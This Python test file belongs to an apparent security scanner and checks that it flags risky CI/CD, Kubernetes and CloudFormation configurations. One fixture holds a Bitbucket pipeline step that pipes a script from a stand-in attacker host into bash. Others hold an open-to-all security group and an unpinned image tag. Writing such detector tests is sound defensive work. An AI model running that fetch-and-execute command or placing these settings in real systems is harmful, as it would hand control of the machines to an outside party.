"""Phase 3 exit criteria tests."""

from __future__ import annotations

import json
from pathlib import Path

from argus.core.config import Config
from argus.core.plugin import ScannerContext
from argus.core.project import Project
from argus.inventory.asset_map import build_inventory
from argus.scanners.cicd import CicdScanner
from argus.scanners.cloud import CloudScanner
from argus.scanners.container import ContainerScanner


def _ctx(tmp_path: Path, *files: tuple[str, str]) -> ScannerContext:
    for name, content in files:
        p = tmp_path / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")
    return ScannerContext(project=Project.from_path(tmp_path), config=Config())


def test_cicd_bitbucket_pipeline(tmp_path: Path) -> None:
    bb = """
pipelines:
  default:
    - step:
        script:
          - curl https://evil.example/install.sh | bash
"""
    rules = {f.rule_id for f in CicdScanner().scan(_ctx(tmp_path, ("bitbucket-pipelines.yml", bb)))}
    assert "cicd.curl-pipe-bash" in rules


def test_container_k8s_image_latest(tmp_path: Path) -> None:
    manifest = """
apiVersion: apps/v1
kind: Deployment
spec:
  template:
    spec:
      containers:
      - name: web
        image: nginx:latest
"""
    rules = {f.rule_id for f in ContainerScanner().scan(_ctx(tmp_path, ("deploy.yaml", manifest)))}
    assert "container.k8s-image-latest" in rules


def test_cloud_cloudformation_template(tmp_path: Path) -> None:
    cfn = """
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  WebSG:
    Type: AWS::EC2::SecurityGroup
    Properties:
      SecurityGroupIngress:
        - CidrIp: 0.0.0.0/0
"""
    rules = {f.rule_id for f in CloudScanner().scan(_ctx(tmp_path, ("template.yaml", cfn)))}
    assert "cloud.open-security-group" in rules


def test_inventory_exports_architecture(tmp_path: Path) -> None:
    (tmp_path / "requirements.txt").write_text("django==4.2\n", encoding="utf-8")
    (tmp_path / "Dockerfile").write_text("FROM python:3.12\n", encoding="utf-8")
    (tmp_path / ".github" / "workflows").mkdir(parents=True)
    (tmp_path / ".github" / "workflows" / "ci.yml").write_text("name: ci\n", encoding="utf-8")
    inv = build_inventory(Project.from_path(tmp_path))
    assert inv["counts"]["dependencies"] >= 1
    assert inv["counts"]["ci_cd_files"] >= 1
    assert inv["counts"]["container_files"] >= 1
    assert json.dumps(inv)


def test_cli_infrastructure_commands_registered() -> None:
    import typer
    from argus.cli.main import app

    names = set(typer.main.get_command(app).commands)
    assert {"infrastructure", "inventory"}.issubset(names)
